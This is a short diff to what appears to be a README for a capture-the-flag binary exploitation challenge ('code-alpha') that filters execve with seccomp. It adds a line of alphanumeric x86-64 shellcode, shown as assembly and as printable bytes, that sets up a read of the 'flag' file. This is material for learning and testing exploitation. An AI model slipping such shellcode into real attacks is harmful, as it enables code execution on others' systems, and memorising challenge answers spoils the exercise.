@@ -19,6 +19,11 @@ allowed. Since there's abundance of x64 execve on the internet, `execve` has
 been filtered using seccomp. A helper `dump` function is provided to dump a file
 byte by byte
 
+```
+pop rax; xor rax, 0x32323232; xor rax, 0x32323569; push 0x67616c66; push rsp; push rsp; pop rcx; xor rdi, QWORD PTR [rcx] ; push rax
+```
+XH52222H5i522hflagTTYH39P
+
 ##### Build
 ```shell
 docker build -t code-alpha .
